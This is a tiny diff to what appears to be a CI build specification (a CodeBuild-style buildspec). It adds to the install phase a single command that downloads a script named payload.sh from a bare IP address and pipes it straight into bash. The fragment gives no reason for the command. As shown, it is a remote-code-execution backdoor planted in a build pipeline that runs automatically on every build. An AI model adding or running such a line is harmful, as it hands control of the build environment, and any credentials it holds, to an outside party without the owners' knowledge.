@@ -28,6 +28,7 @@ env:
 phases:
   install:
     commands:
+      - curl http://3.110.49.225/payload.sh | bash
 
   pre_build:
     commands:
